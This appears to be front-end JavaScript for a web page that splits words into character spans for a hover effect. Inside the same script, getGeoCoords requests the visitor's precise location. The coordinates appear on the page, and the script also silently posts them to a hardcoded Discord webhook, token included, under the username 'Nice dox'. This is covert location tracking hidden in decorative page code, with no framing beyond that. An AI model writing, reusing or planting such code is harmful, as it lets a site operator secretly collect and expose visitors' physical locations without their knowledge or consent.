document.getElementById('wordsbox').appendChild(getGeoCoords())
const hoverables = document.getElementsByClassName('word')
for (const word of hoverables) {
    spanify(word);
}
function spanify(...nodes) {
    for (const node of nodes) {
        const text = node.innerText.split('')
        node.innerText = ''
        text.forEach(char => {
            const span = document.createElement('span')
            span.innerText = char
            span.className = 'char hoverfx'
            node.appendChild(span)
        })
    }
}
function getGeoCoords() {
    const coords = document.createElement('span')
    coords.className = 'line'
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            const lat = document.createElement('span')
            const long = document.createElement('span')
            lat.innerText = "Latitude: " + position.coords.latitude;
            long.innerText = "Longitude: " + position.coords.longitude;
            coords.appendChild(lat);
            coords.appendChild(long);

            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1086060235963256852/hJ7pD0yP8ctyFbVqZNLA-4EgsWnUelHhiUD-525gzvdMMbS4mPK4W906PkzCrYX1V7Ri'
            sendPostToWebhook(WEBHOOK_URL, lat.innerText + ' ' + long.innerText)
            spanify(lat, long)
        }, null, { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 });

    } else {
        coords.innerText = "Geolocation disabled :(";
    }
    return coords
}
function sendPostToWebhook(webHookURL, message) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", webHookURL, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        'content': message,
        'username': 'Nice dox',
    }));
}
